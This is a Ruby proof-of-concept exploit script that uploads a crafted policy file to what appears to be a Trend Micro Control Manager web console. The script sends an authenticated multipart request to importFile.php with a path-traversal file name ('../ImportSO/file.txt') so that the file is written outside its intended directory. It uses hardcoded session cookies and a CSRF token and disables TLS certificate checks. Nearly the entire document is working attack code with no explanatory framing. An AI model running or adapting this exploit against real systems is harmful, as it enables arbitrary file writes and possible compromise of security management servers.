#! /usr/bin/env ruby

require 'net/http' 
require 'net/https'
require 'uri'
require 'json'

begin
	require 'mime/types'
rescue LoadError
	puts "[-] 'mine/types' is not installed..."
	puts "[!] please run the following 'gem install mime-types'"
end

require 'securerandom'

policy = "{\"policy\":[{\"id\":\"1\",\"policyTemplateVersion\":\"1.15\",\"policyName\":\"deadbeeftest\",\"policyVersion\":\"1\",\"productID\":\"154.2\",\"settings\":\"{\"data\":[{\"wcomponent_name\":\"comDDIDenyAllowList\",\"wcomponent_version\":\"1.2\",\"wcomponent_order\":1,\"settings\":{\"list\":{\"denylist\":\"q1bKLFCyio7VUUrLzEmFsEqLciCMlPzcxMw8ELsWAA==\",\"allowlist\":\"i44FAA==\"}}},{\"wcomponent_name\":\"comDDIMonitoredNetwork\",\"wcomponent_version\":\"1.5\",\"wcomponent_order\":2,\"settings\":{\"groupLists\":[{\"groupname\":\"Default\",\"grouplabel\":\"monitored_ip_1\",\"ip_zones\":[{\"value\":\"10.0.0.0-10.255.255.255\",\"option\":\"1\"},{\"value\":\"172.16.0.0-172.31.255.255\",\"option\":\"1\"},{\"value\":\"192.168.0.0-192.168.255.255\",\"option\":\"1\"}],\"parent\":\"\",\"children\":[]}]}},{\"wcomponent_name\":\"comDDIRegisteredServices\",\"wcomponent_version\":\"1.4\",\"wcomponent_order\":3,\"settings\":{\"serviceList_info\":[{\"Service\":\"ftp\",\"ipaddress\":\"192.168.1.74\",\"servername\":\"testing\"}]}},{\"wcomponent_name\":\"comDDIDtasSetting\",\"wcomponent_version\":\"1.4\",\"wcomponent_order\":4,\"settings\":{\"enable\":0,\"analysis_module\":\"external\",\"vitrual_analyzer\":\"\",\"api_key\":\"\",\"network_type\":\"\",\"sandbox_port\":\"\",\"configure\":\"dhcp\",\"enable_suspicious_files\":\"1\",\"max_size\":\"15\",\"grid\":1}}]}\",\"activatedSettings\":\"{\"data\":[{\"wcomponent_name\":\"comDDIDenyAllowList\",\"wcomponent_version\":\"1.2\",\"wcomponent_order\":1,\"settings\":{\"list\":{\"denylist\":\"q1bKLFCyio7VUUrLzEmFsEqLciCMlPzcxMw8ELsWAA==\",\"allowlist\":\"i44FAA==\"}}},{\"wcomponent_name\":\"comDDIMonitoredNetwork\",\"wcomponent_version\":\"1.5\",\"wcomponent_order\":2,\"settings\":{\"groupLists\":[{\"groupname\":\"Default\",\"grouplabel\":\"monitored_ip_1\",\"ip_zones\":[{\"value\":\"10.0.0.0-10.255.255.255\",\"option\":\"1\"},{\"value\":\"172.16.0.0-172.31.255.255\",\"option\":\"1\"},{\"value\":\"192.168.0.0-192.168.255.255\",\"option\":\"1\"}],\"parent\":\"\",\"children\":[]}]}},{\"wcomponent_name\":\"comDDIRegisteredServices\",\"wcomponent_version\":\"1.4\",\"wcomponent_order\":3,\"settings\":{\"serviceList_info\":[{\"Service\":\"ftp\",\"ipaddress\":\"192.168.1.74\",\"servername\":\"testing\"}]}},{\"wcomponent_name\":\"comDDIDtasSetting\",\"wcomponent_version\":\"1.4\",\"wcomponent_order\":4,\"settings\":{\"enable\":0,\"analysis_module\":\"external\",\"vitrual_analyzer\":\"\",\"api_key\":\"\",\"network_type\":\"\",\"sandbox_port\":\"\",\"configure\":\"dhcp\",\"enable_suspicious_files\":\"1\",\"max_size\":\"15\",\"grid\":1}}]}\",\"managedSettings\":\"\",\"repeatCycleInMins\":\"1440\"}]}"

uri = URI.parse("https://192.168.1.72/")
boundary = SecureRandom.hex

cookies =  "ASP_NET_SessionId=55hjl0burcvx21uslfxjbabs; "
cookies << "wf_cookie_path=%2F; WFINFOR=jfitts; "
cookies << "PHPSESSID=fc4o2lg5fpgognc28sjcitugj1; "
cookies << "wf_CSRF_token=bd52b54ced23d3dc257984f68c39d34b; "
cookies << "un=a8cad04472597b0c1163743109dad8f1; userID=1; "
cookies << "LANG=en_US; "
cookies << "wids=modTmcmCriticalEvents%2CmodTmcmUserThreatDetection%2CmodTmcmAppStatusSrv%2CmodTmcmTopThreats%2CmodTmcmEndpointThreatDetection%2CmodTmcmCompCompliance%2C; "
cookies << "lastID=65; cname=mainConsole; theme=default; lastTab=-1"

header = {
	"Cookie"	=>	cookies,
	"Accept-Encoding"	=>	"gzip;q=1.0,deflate;q=0.6,identity;q=0.3",
	"Connection"	=>	"close",
	"Accept"	=>	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language"	=> "en-US,en;q=0.5",
	"Content-Type" => "multipart/form-data, boundary=#{boundary}"
}

post_body = []
post_body << "--#{boundary}\r\n"
post_body << "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
post_body << "importPolicy\r\n"
post_body << "--#{boundary}\r\n"
post_body << "Content-Disposition: form-data; name=\"fileSize\"\r\n\r\n"
post_body << "2097152\r\n"
post_body << "--#{boundary}\r\n"
post_body << "Content-Disposition: form-data; name=\"fileName\"\r\n\r\n"
post_body << "../ImportSO/file.txt\r\n"
post_body << "--#{boundary}\r\n"
post_body << "Content-Disposition: form-data; name=\"filename\";\r\n"
post_body << "filename=\"policy.cmpolicy\"\r\n"
post_body << "Content-Type: application/octet-stream\r\n\r\n"
post_body << "#{policy}\r\n\r\n"
post_body << "--#{boundary}--\r\n"

http = Net::HTTP.new(uri.host, 443)
http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE

req = Net::HTTP::Post.new("/webapp/widget/repository/widgetPool/wp1/widgetBase/modTMCM/inc/importFile.php", header)
req.body = post_body.join

res = http.request(req)

if res.code == "200" && res.read_body =~ /Import Successfully/
	puts "[+] File successfully uploaded"
end
